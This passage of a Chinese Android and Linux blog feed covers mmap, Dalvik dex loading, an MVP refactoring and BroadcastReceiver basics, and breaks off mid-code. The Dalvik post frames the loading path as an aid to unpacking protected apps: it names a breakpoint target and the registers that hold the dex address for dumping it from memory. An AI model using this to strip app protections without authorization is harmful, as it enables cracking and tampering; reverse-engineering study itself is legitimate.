常规文件："></a>2.1 常规文件：</h3><pre><code>1. 进程发起读文件请求2. 内核通过查找进程文件符表，定位到内核已打开文件集上的文件信息，从而找到该文件的inode3. inode在address_space上查找要请求的文件页是否已经缓存在页缓存中。如果存在，直接返回4. 如果不存在，则通过inode定位到文件磁盘地址，将数据从磁盘复制到页缓存，然后再发起读页面的过程，从而将页缓存中的数据发给用户进程。</code></pre><p>实际上呢，页缓存存在于内核空间，用户空间是不能对它直接寻址的。所以还需要将页缓存中的数据再次拷贝到内存对应的用户空间去才行。</p><p><strong>所以也就会有两次拷贝。</strong></p><h3 id="2-2-mmap"><a href="#2-2-mmap" class="headerlink" title="2.2 mmap"></a>2.2 mmap</h3><p>它实现了用户空间和内核空间的直接交互，就省去了额外拷贝的过程，所以就只会有一次拷贝。</p><p><strong>优点：</strong></p><pre><code>1. 对文件的读取操作跨过了页缓存，减少了数据的拷贝次数，用内存读写取代I/O读写，提高了文件读取效率。2. 实现了用户空间和内核空间的高效交互方式。两空间的各自修改操作可以直接反映在映射的区域内，从而被对方空间及时捕捉。3. 提供进程间共享内存及相互通信的方式。不管是父子进程还是无亲缘关系的进程，都可以将自身用户空间映射到同一个文件或匿名映射到同一片区域。从而通过各自对映射区域的改动，达到进程间通信和进程间共享的目的。 同时，如果进程A和进程B都映射了区域C，当A第一次读取C时通过缺页从磁盘复制文件页到内存中；但当B再读C的相同页面时，虽然也会产生缺页异常，但是不再需要从磁盘中复制文件过来，而可直接使用已经保存在内存中的文件数据。4. 可用于实现高效的大规模数据传输。内存空间不足，是制约大数据操作的一个方面，解决方案往往是借助硬盘空间协助操作，补充内存的不足。但是进一步会造成大量的文件I/O操作，极大影响效率。这个问题可以通过mmap映射很好的解决。换句话说，但凡是需要用磁盘空间代替内存的时候，mmap都可以发挥其功效。</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;脱360的壳时需要给mmap函数下断点，总结IPC的共享内存时也需要用到mmap，所以本文就先总结一下mmap相关内容。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="汇编" scheme="http://imlzq.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Dalvik虚拟机加载Dex的流程</title>
    <link href="http://imlzq.com/2017/10/11/Dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8A%A0%E8%BD%BDDex%E7%9A%84%E6%B5%81%E7%A8%8B/"/>
    <id>http://imlzq.com/2017/10/11/Dalvik虚拟机加载Dex的流程/</id>
    <published>2017-10-10T16:00:00.000Z</published>
    <updated>2018-02-12T04:21:12.310Z</updated>
    
    <content type="html"><![CDATA[<p>上篇文章Android脱壳（基于第一代加壳）介绍了如何使用ida pro在运行Dalvik虚拟机的Android4.4手机上脱壳。其中有一个很重要的步骤就是给libdvm.so的_Z21dvmDexFileOpenPartialPKviPP6DvmDex函数下断点，用于确定dex在内存空间中的起始位置和大小，那这篇文章就挖一下Dalvik虚拟机是如何加载dex文件的。</p><blockquote><p><a href="https://source.android.com/source/downloading" target="_blank" rel="noopener">Android源码</a></p></blockquote><a id="more"></a>    <p>##开始</p><p><a href="www.baidu.com">Dalvik虚拟机介绍</a></p><ul><li>Dalvik虚拟机在加载dex之前，会判断本地是否存在odex文件（<a href="www.baidu.com">Dex\ELF文件格式</a>, <a href="www.baidu.com">ODex与Dex比较</a>）</li><li>如果存在，则直接加载odex</li><li>如果不存在，使用dexopt优化dex文件为odex（odex的后缀类型仍然为dex）</li><li>除此之外，dexopt还担任dex的校验功能。它会判断DexHeader中的时间戳和crc校验值，从而判断该dex是否合法（弱校验，可欺骗绕过）</li></ul><p>故从上我们可以知道，在APP运行时dexopt占有很重要的一环，因此，我们只需在dexopt中找到加载dex的那段代码即可跟踪Dalvik虚拟机加载dex的流程。</p><p>dexopt的主函数位于<a href="http://androidxref.com/4.1.1/xref/dalvik/dexopt/OptMain.cpp" target="_blank" rel="noopener">OptMain.cpp</a></p><pre><code>/* * Main entry point.  Decide where to go. */int main(int argc, char* const argv[]){    set_process_name(&quot;dexopt&quot;);    setvbuf(stdout, NULL, _IONBF, 0);    if (argc &gt; 1) {        if (strcmp(argv[1], &quot;--zip&quot;) == 0)            return fromZip(argc, argv);        else if (strcmp(argv[1], &quot;--dex&quot;) == 0)            return fromDex(argc, argv);        else if (strcmp(argv[1], &quot;--preopt&quot;) == 0)            return preopt(argc, argv);    }    fprintf(stderr,        &quot;Usage:\n\n&quot;        &quot;Short version: Don&apos;t use this.\n\n&quot;        &quot;Slightly longer version: This system-internal tool is used to\n&quot;        &quot;produce optimized dex files. See the source code for details.\n&quot;);    return 1;}</code></pre><p>跟踪14行进入fromDex<br>这里面先进行的是一些参数和环境的判断，配置<a href="www.baidu.com">dexOptMode、verifyMode</a>，初始化vm相关环境，然后进入dvmContinueOptimization函数继续接下来的优化过程。</p><pre><code>static int fromDex(int argc, char* const argv[]){    int result = -1;    bool vmStarted = false;    char* bootClassPath = NULL;    int fd, flags, vmBuildVersion;    long offset, length;    const char* debugFileName;    u4 crc, modWhen;    char* endp;    bool onlyOptVerifiedDex = false;    DexClassVerifyMode verifyMode;    DexOptimizerMode dexOptMode;if (argc &lt; 10) {    /* don&apos;t have all mandatory args */    ALOGE(&quot;Not enough arguments for --dex (found %d)&quot;, argc);    goto bail;}/* skip &quot;--dex&quot; */argc--;argv++;/* * Extract the args. */GET_ARG(vmBuildVersion, strtol, &quot;bad vm build&quot;);if (vmBuildVersion != DALVIK_VM_BUILD) {    ALOGE(&quot;DexOpt: build rev does not match VM: %d vs %d&quot;,        vmBuildVersion, DALVIK_VM_BUILD);    goto bail;}GET_ARG(fd, strtol, &quot;bad fd&quot;);GET_ARG(offset, strtol, &quot;bad offset&quot;);GET_ARG(length, strtol, &quot;bad length&quot;);debugFileName = *++argv;--argc;GET_ARG(modWhen, strtoul, &quot;bad modWhen&quot;);GET_ARG(crc, strtoul, &quot;bad crc&quot;);GET_ARG(flags, strtol, &quot;bad flags&quot;);ALOGV(&quot;Args: fd=%d off=%ld len=%ld name=&apos;%s&apos; mod=%#x crc=%#x flg=%d (argc=%d)&quot;,    fd, offset, length, debugFileName, modWhen, crc, flags, argc);assert(argc &gt; 0);if (--argc == 0) {    bootClassPath = strdup(&quot;&quot;);} else {    int i, bcpLen;    char* const* argp;    char* cp;    bcpLen = 0;    for (i = 0, argp = argv; i &lt; argc; i++) {        ++argp;        ALOGV(&quot;DEP: &apos;%s&apos;&quot;, *argp);        bcpLen += strlen(*argp) + 1;    }    cp = bootClassPath = (char*) malloc(bcpLen +1);    for (i = 0, argp = argv; i &lt; argc; i++) {        int strLen;        ++argp;        strLen = strlen(*argp);        if (i != 0)            *cp++ = &apos;:&apos;;        memcpy(cp, *argp, strLen);        cp += strLen;    }    *cp = &apos;\0&apos;;    assert((int) strlen(bootClassPath) == bcpLen-1);}ALOGV(&quot;  bootclasspath is &apos;%s&apos;&quot;, bootClassPath);/* start the VM partway *//* ugh -- upgrade these to a bit field if they get any more complex */if ((flags &amp; DEXOPT_VERIFY_ENABLED) != 0) {    if ((flags &amp; DEXOPT_VERIFY_ALL) != 0)        verifyMode = VERIFY_MODE_ALL;    else        verifyMode = VERIFY_MODE_REMOTE;} else {    verifyMode = VERIFY_MODE_NONE;}if ((flags &amp; DEXOPT_OPT_ENABLED) != 0) {    if ((flags &amp; DEXOPT_OPT_ALL) != 0)        dexOptMode = OPTIMIZE_MODE_ALL;    else        dexOptMode = OPTIMIZE_MODE_VERIFIED;} else {    dexOptMode = OPTIMIZE_MODE_NONE;}if (dvmPrepForDexOpt(bootClassPath, dexOptMode, verifyMode, flags) != 0) {    ALOGE(&quot;VM init failed&quot;);    goto bail;}vmStarted = true;/* do the optimization */if (!dvmContinueOptimization(fd, offset, length, debugFileName,        modWhen, crc, (flags &amp; DEXOPT_IS_BOOTSTRAP) != 0)){    ALOGE(&quot;Optimization failed&quot;);    goto bail;}result = 0;bail:    /*     * In theory we should gracefully shut the VM down at this point.  In     * practice that only matters if we&apos;re checking for memory leaks with     * valgrind -- simply exiting is much faster.     *     * As it turns out, the DEX optimizer plays a little fast and loose     * with class loading.  We load all of the classes from a partially-     * formed DEX file, which is unmapped when we&apos;re done.  If we want to     * do clean shutdown here, perhaps for testing with valgrind, we need     * to skip the munmap call there.     */#if 0    if (vmStarted) {        ALOGI(&quot;DexOpt shutting down, result=%d&quot;, result);        dvmShutdown();    }#endif    free(bootClassPath);    ALOGV(&quot;DexOpt command complete (result=%d)&quot;, result);    return result;}</code></pre><p>而在dvmContinueOptimization函数中，在简单判断dex是否合法之后会将整个dex文件通过<a href="www.baidu.com">mmap</a>映射到内存中，然后重写文件，包括字符的重排序、结构对齐、类验证及字节码优化等，方便对文件进行处理。</p><pre><code>/* * Do the actual optimization.  This is executed in the dexopt process. * * For best use of disk/memory, we want to extract once and perform * optimizations in place.  If the file has to expand or contract * to match local structure padding/alignment expectations, we want * to do the rewrite as part of the extract, rather than extracting * into a temp file and slurping it back out.  (The structure alignment * is currently correct for all platforms, and this isn&apos;t expected to * change, so we should be okay with having it already extracted.) * * Returns &quot;true&quot; on success. */bool dvmContinueOptimization(int fd, off_t dexOffset, long dexLength,    const char* fileName, u4 modWhen, u4 crc, bool isBootstrap){    DexClassLookup* pClassLookup = NULL;    RegisterMapBuilder* pRegMapBuilder = NULL;    assert(gDvm.optimizing);    ALOGV(&quot;Continuing optimization (%s, isb=%d)&quot;, fileName, isBootstrap);    assert(dexOffset &gt;= 0);    /* quick test so we don&apos;t blow up on empty file */    if (dexLength &lt; (int) sizeof(DexHeader)) {        ALOGE(&quot;too small to be DEX&quot;);        return false;    }    if (dexOffset &lt; (int) sizeof(DexOptHeader)) {        ALOGE(&quot;not enough room for opt header&quot;);        return false;    }    bool result = false;    /*     * Drop this into a global so we don&apos;t have to pass it around.  We could     * also add a field to DexFile, but since it only pertains to DEX     * creation that probably doesn&apos;t make sense.     */    gDvm.optimizingBootstrapClass = isBootstrap;    {        /*         * Map the entire file (so we don&apos;t have to worry about page         * alignment).  The expectation is that the output file contains         * our DEX data plus room for a small header.         */        bool success;        void* mapAddr;        mapAddr = mmap(NULL, dexOffset + dexLength, PROT_READ|PROT_WRITE,                    MAP_SHARED, fd, 0);        if (mapAddr == MAP_FAILED) {            ALOGE(&quot;unable to mmap DEX cache: %s&quot;, strerror(errno));            goto bail;        }        bool doVerify, doOpt;        if (gDvm.classVerifyMode == VERIFY_MODE_NONE) {            doVerify = false;        } else if (gDvm.classVerifyMode == VERIFY_MODE_REMOTE) {            doVerify = !gDvm.optimizingBootstrapClass;        } else /*if (gDvm.classVerifyMode == VERIFY_MODE_ALL)*/ {            doVerify = true;        }        if (gDvm.dexOptMode == OPTIMIZE_MODE_NONE) {            doOpt = false;        } else if (gDvm.dexOptMode == OPTIMIZE_MODE_VERIFIED ||                   gDvm.dexOptMode == OPTIMIZE_MODE_FULL) {            doOpt = doVerify;        } else /*if (gDvm.dexOptMode == OPTIMIZE_MODE_ALL)*/ {            doOpt = true;        }        /*         * Rewrite the file.  Byte reordering, structure realigning,         * class verification, and bytecode optimization are all performed         * here.         *         * In theory the file could change size and bits could shift around.         * In practice this would be annoying to deal with, so the file         * layout is designed so that it can always be rewritten in place.         *         * This creates the class lookup table as part of doing the processing.         */        success = rewriteDex(((u1*) mapAddr) + dexOffset, dexLength,                    doVerify, doOpt, &amp;pClassLookup, NULL);        if (success) {            DvmDex* pDvmDex = NULL;            u1* dexAddr = ((u1*) mapAddr) + dexOffset;            if (dvmDexFileOpenPartial(dexAddr, dexLength, &amp;pDvmDex) != 0) {                ALOGE(&quot;Unable to create DexFile&quot;);                success = false;            } else {                /*                 * If configured to do so, generate register map output                 * for all verified classes.  The register maps were                 * generated during verification, and will now be serialized.                 */                if (gDvm.generateRegisterMaps) {                    pRegMapBuilder = dvmGenerateRegisterMaps(pDvmDex);                    if (pRegMapBuilder == NULL) {                        ALOGE(&quot;Failed generating register maps&quot;);                        success = false;                    }                }                DexHeader* pHeader = (DexHeader*)pDvmDex-&gt;pHeader;                updateChecksum(dexAddr, dexLength, pHeader);                dvmDexFileFree(pDvmDex);            }        }      ..........}</code></pre><p>而如果重写成功，则会获取到dex在内存中的实际地址（这个地址由mmap映射的地址和dexoffset偏移量联合确定）。<br>这时就会调用dvmDexFileOpenPartial(const void<em> addr, int len, DvmDex*</em> ppDvmDex)，第一和第二个参数，就是上篇文章提到的dex起始地址和dex长度，它们分别存放在R0和R1寄存器。有了这两个参数，我们就能将dex直接从内存中抠出来。</p><p>##未完待续：继续接下来的加载流程</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上篇文章Android脱壳（基于第一代加壳）介绍了如何使用ida pro在运行Dalvik虚拟机的Android4.4手机上脱壳。其中有一个很重要的步骤就是给libdvm.so的_Z21dvmDexFileOpenPartialPKviPP6DvmDex函数下断点，用于确定dex在内存空间中的起始位置和大小，那这篇文章就挖一下Dalvik虚拟机是如何加载dex文件的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://source.android.com/source/downloading&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Android源码&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Dalvik" scheme="http://imlzq.com/tags/Dalvik/"/>
    
  </entry>
  
  <entry>
    <title>Android重构记录及其模块化</title>
    <link href="http://imlzq.com/2017/02/24/Android%E9%87%8D%E6%9E%84%E8%AE%B0%E5%BD%95%E5%8F%8A%E5%85%B6%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    <id>http://imlzq.com/2017/02/24/Android重构记录及其模块化/</id>
    <published>2017-02-24T05:11:41.000Z</published>
    <updated>2018-02-12T03:30:37.108Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文仅为个人观点，不完全符合模块化的标准定义及其拓展。思路类似，仅此而已。不可当做模块化的标准理解</strong></p><p><strong>如果各位对于本博客中提到的任何思路或者架构有任何看法，欢迎讨论。以下仅是这3天的个人考虑，基于个人能力及视野的限制，很有可能不完善，欢迎批评指正，共同进步</strong></p><p><strong>转载请注明出处：<a href="http://blog.csdn.net/jonstank2013?viewmode=contents" target="_blank" rel="noopener">http://blog.csdn.net/jonstank2013?viewmode=contents</a></strong></p><a id="more"></a><p>##项目基础情况##<br>项目人群：百万日活<br>整体大小：类数量未记，Size 500+M</p><p>##起因##<br>这几天正在重构公司的项目，因为本月16日看项目源码时发现项目的内部架构极其冗余（4年前的项目，延伸至今），不管是从业务的拓展还是现有架构的维护上的体验都极其恶劣。一个接触该项目的新人很难在没有需求文档的情况下理清整体的业务流程及架构。而由于业务需求太多导致团队没有足够的时间去做全新的重构。</p><p><strong>以下为原架构的示例图：</strong><br><img src="http://img.blog.csdn.net/20170224100151701?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvSm9uc1RhbmsyMDEz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="原始架构"></p><p>这种架构也就是最原始的Activity-Fragment-Manager模式，Activity或者Fragment通过接口与各Manager沟通联系。这种模式的弊端在于Activity承担了太多的工作，随着项目的进行Activity会越来越大，导致其越来越难以维护。单从MainActivity来说，就足有2500多行。所有的业务代码和逻辑代码全都冗余在一块，甚至还包含了很多Lisenter和Callback的定义，而这些都绝对不应该是Activity的功能。为了更好的维护（当项目变得非常庞大时），我们可以从Activity中把逻辑功能分离处理，交由另外的一个逻辑管理类处理，而逻辑管理类再和其他的工具类联系。这样就可以极大的增加代码的可维护性。</p><p>而上面提到的逻辑、业务分离的方式实际上也就是MVP/MVVM的方式。</p><p>##事件总线##<br>项目中还存在着事件总线（一个自定义的EventManager），跟EventBus类似，只是更轻量级。<br>EventManager的功能为Subscribe，Send。实际上也就是一旦Event发生了事件，那么EventManager就会通知所有订阅了该事件的对象处理该事件，实现“何处订阅，何处处理”。<br>从一个第三方通用库的角度来说，这种方式是绝对可行且意义非凡的。但对于一个模块化或者MVP/MVVM来说，它的一些通用配置就有点多余了。<br>例如”何处订阅，何处处理“，在Activity-Managers-Callback的模式中，可以有多个不同的对象订阅同一个事件，发生Event后这些对象都会受到通知。但这会造成一个非常大的弊端，也就是代码的维护性非常差。因为开发者不会知道究竟是谁订阅了这个事件，而这个事件又从哪发送到了哪去解决，一旦发生问题，非常难以调试及定位。<br>而在MVP中，所有的逻辑操作都应在Presenter中处理并分发，也就是说EventBus只应与Presenter进行联系。它不行也绝对不能与其他的类绑定，因为这会违背架构的定义，以及破坏架构的原则。</p><p>因此EventManager在MVP中就变成了一个简化版的Rxbus。Rxbus相关信息可见我之前的博客：<a href="http://blog.csdn.net/jonstank2013/article/details/50574871" target="_blank" rel="noopener">http://blog.csdn.net/jonstank2013/article/details/50574871</a></p><p>Github地址为：<a href="https://github.com/CytQ/Rxbus" target="_blank" rel="noopener">https://github.com/CytQ/Rxbus</a></p><p><strong>Rxbus和EventBus在事件的处理上有着很明显的不同</strong></p><p>EventBus是针对Event做订阅，一旦发生事件，EventBus会通知所有订阅的对象进行处理。<br>而Rxbus订阅的则是事件总线，一旦事件总线上存在事件（也就是Event被触发），那么所有订阅了事件总线的对象都会收到Event的通知。</p><p>根据他们俩的性质，可以很明确的了解到，EventBus可以针对所有情况，不管是Activity-Manager-Callback模式还是MVP/MVVM。而Rxbus就有了局限性，它只能使用于MVP/MVVM等业务逻辑分离的情况。<br>但除此之外，Rxbus还具有一些EventBus不具有的特性，那就是他可以使用Rxjava带来的一系列好处。例如快速切换线程，一行代码即可。而在EventBus中，如果想要对Event切换处理线程，那么就必须人为的控制一个线程管理类或者线程池。</p><p>而将Rxbus应用于MVP中，只需处理好他的订阅及取消就可以了。因为同一时间最好只能存在一个Presenter处理逻辑事件。而如果存在多个Presenter，对效率的影响也不高，一个函数调用而已。</p><p><strong>现存在我Git中的Rxbus功能不是特别完善，但我会接下来的时间里不断的拓展它，让他更能符合开发的实际情况。例如多个Presenter同时存在时，如何正确的分发Event</strong></p><p>##定义新架构##<br>因此在经过考虑之后，我提出了以下的重构建议。<br><img src="http://img.blog.csdn.net/20170224114905196?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvSm9uc1RhbmsyMDEz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="NewArchitecture"></p><p>MVP结合Rxjava构建全响应式架构。将逻辑代码从View层中完全剥离出来，交由Presenter处理。同时将之前存在的大量Manager和工具类交给DataManager管理。Presenter与Model之间、Presenter与Rxbus使用Observable交流。</p><p><strong>而在具体实现时，在View与Presenter之间再独立一层Contract，使View依赖于Contract中的Presenter，而Presenter依赖于Contract中的View。从而实现接口隔离：对象应关联于接口，而不应该是其具体实现类。另外还可解决一个Case：业务代码难以理清（一个新人只需了解Contract中相关的定义即可快速了解View和Presenter的功能，一目了然）</strong><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainContract</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">interface</span> <span class="title">Presenter</span> <span class="keyword">extends</span> <span class="title">BasePresenter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">interface</span> <span class="title">View</span> <span class="keyword">extends</span> <span class="title">BaseView</span>&lt;<span class="title">Presenter</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">showMsg</span><span class="params">(String eventName)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BasePresenter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">subscribe</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">unSubscribe</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BaseView</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setPresenter</span><span class="params">(T presenter)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这种方案可以很好的解决Activity代码冗余，整体架构耦合性高的问题。缺点在于需要控制很多的Presenter及Contract，代码的流程变复杂。但我认为在项目过大时，这种缺点比之其优势来说，不值一提。</p><p>##发现新问题##<br>在评审并通过上述新架构方案后，我开始尝试部分重构。而前天与昨天，就遇到了一个以前重构小项目时从来没遇到的问题：依赖项实在是太多。</p><p>因为依赖项众多以及需要针对每一个依赖项都做单独的模块处理（编译器不支持自动批量导入和修改），因此前天及昨天均花费了大量的时间在导入及Fix依赖类上，3个类简单类最后延伸为了150多个类，这还是我注释掉了很多业务代码的结果。总时间超过半天，这是完完全全的体力劳动，并且会极大的降低重构的效率，但对此又无可奈何。因为一个项目大了之后，势必会存在很多的业务代码及其管理类，即便架构设计得再完美，耦合性再低，也很难避免这种情况的发生。引入一个类，就意味着需要引入它的继承类、实现类、使用的工具类等等。</p><p>##模块化思路##</p><p>那么在编译器不能实现自动导入自动匹配的时候，我们是否可以采用一种编程协议去规范代码，让任何独立的功能都能快速或者直接模块化，让它与其他的功能模块松耦合，（可能？）从而避免或者减缓以上的情况。同时还可以避免65535，可支持动态加载（不更新APK的情况下完成新业务的下载及显示）</p><p><img src="http://img.blog.csdn.net/20170224120252522?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvSm9uc1RhbmsyMDEz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="Module"></p><p>这种高度模块化的结构还有一种优势，就是方便加载及快速卸载（MultiDex），还可以结合【动态加载】实现本地APP功能的快速更新（无需下载更新本地APK）。<br>【待定】如果我们以后开始一个新的项目时，可预见性的了解到该项目肯定会非常庞大或者易引起65535，不如考虑一下这种高度模块化的方式？提高项目灵活性的同时还可以为以后可能的重构铺路（假设性原则？假如会发生）</p><p><strong>方法二：</strong>创建一个AS的插件，使其支持自动导入和自动Fix。但难度较高，需要判断很多条件</p><p><strong>以上就是这段时间内重构项目时的经历及部分个人想法，如果以后有新的想法会及时更新本文。</strong></p><p><strong>另外，如果各位对于本博客中提到的任何思路或者架构有任何看法，欢迎讨论。这是这3天的个人考虑，基于个人能力及视野的限制，很有可能不完善，欢迎各位批评指正，共同进步</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文仅为个人观点，不完全符合模块化的标准定义及其拓展。思路类似，仅此而已。不可当做模块化的标准理解&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果各位对于本博客中提到的任何思路或者架构有任何看法，欢迎讨论。以下仅是这3天的个人考虑，基于个人能力及视野的限制，很有可能不完善，欢迎批评指正，共同进步&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;转载请注明出处：&lt;a href=&quot;http://blog.csdn.net/jonstank2013?viewmode=contents&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://blog.csdn.net/jonstank2013?viewmode=contents&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
      <category term="架构" scheme="http://imlzq.com/tags/%E6%9E%B6%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>BroadcastReceiver —— 广播全解析</title>
    <link href="http://imlzq.com/2016/06/08/BroadcastReceiver/"/>
    <id>http://imlzq.com/2016/06/08/BroadcastReceiver/</id>
    <published>2016-06-07T16:00:00.000Z</published>
    <updated>2018-02-12T10:19:49.356Z</updated>
    
    <content type="html"><![CDATA[<p>广播是Android的四大组件之一，在Android的源码中也大量存在并使用了它，此外它也是一种常见的跨进程通信方式，由此可见它的重要性。</p><p>这里就对广播的底层实现进行一个解析</p><p><strong>本文中间包含了广播的代码细节，可以直接查看最后的“一句话总结”</strong></p><a id="more"></a>    <h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>首先，广播可以分为动态和静态注册两种方式。</p><p>动态注册的含义也就是在代码中注册广播，程序关闭是无效，在同等优先级下它会比静态注册的广播先调用</p><p>静态注册是指在AndroidManifest文件中注册的广播，由于APK在安装时静态注册的广播的信息会被PMS扫描并被添加到系统的表中，因此它在程序关闭时依然有效，例如开机自启就是属于检测自启的动作，如果发生该广播，就会启动自身的APP</p><p>上面的两种分类属于大分类，又可以将他们细分为普通广播、粘性广播、有序广播等等。</p><p><strong>有序广播</strong><br>使用sendOrderedBroadcast发送广播，高优先级的会先收到广播，然后由它决定是否处理、下传或者是终止该广播的传递</p><p><strong>粘性广播</strong><br>使用sendStickyBroadcast发送广播。如果发送时当前系统中并没有对应的广播接收器，那么它仍然会驻留在系统中，一旦有对应的广播接收器注册，那么就立即发送给它。</p><p>而如果它发送了多条，多条都没人接收的话怎么办呢？系统就会保存最后一条广播，因为这样就可以避免粘性广播在系统中的冗余。使用removeStickyBroadcast可以移除该Intent。</p><p>其实广播本来就是为了解耦，而粘性广播则更加解耦，因为接收方甚至可以完全不存在，这肯定是它的一个优势</p><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>onReceive是在主线程中被调用的，因此要注意不能在onReceive中出现耗时操作。如果一定要有，那么就最好开一个线程或者是交给service去处理</p><p>此外，只有当接受到了广播后，BroadcastReceiver这个类才会被实例化，不管它是动态还是静态注册的。<br>当内存不足时，receiver也会被系统回收掉，所以如果有长时间的任务，最好交给其他的来做，例如service</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p><strong>动态注册</strong></p><ul><li>创建一个BroadcastReceiver</li><li>创建IntentFilter，并指定Action</li><li>registerReceiver(receivcer, intentFilter)</li><li>sendBroadcast(new Intent(“haha”));</li><li>unregisterReceiver(receiver);</li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BroadcastReceiver </span>receiver = new <span class="keyword">BroadcastReceiver() </span>&#123;</span><br><span class="line">           @Override</span><br><span class="line">           public void onReceive(<span class="built_in">Context</span> <span class="built_in">context</span>, Intent intent) &#123;</span><br><span class="line">               Toast.makeText(MainActivity.this, <span class="string">"Receive"</span>, Toast.LENGTH_SHORT).<span class="keyword">show();</span></span><br><span class="line"><span class="keyword"> </span>          &#125;</span><br><span class="line">       &#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">       IntentFilter intentFilter = new IntentFilter()<span class="comment">;</span></span><br><span class="line">       intentFilter.<span class="keyword">addAction("haha");</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword"> </span>      registerReceiver(receiver, intentFilter)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">sendBroadcast(new Intent(<span class="string">"haha"</span>))<span class="comment">;</span></span><br><span class="line">unregisterReceiver(receiver)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>这样也就完成了一个广播的动态注册，但是需要注册的一点，广播注册之后一定要记得取消，一般是在onDestory中取消，其他的根据实际情况取消也是可以的。</p><p><strong>静态注册</strong><br>直接在AndroidManifest文件中添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">".MyReceiver"</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MY_BROADCAST"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>我们从动态注册的广播入手</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span 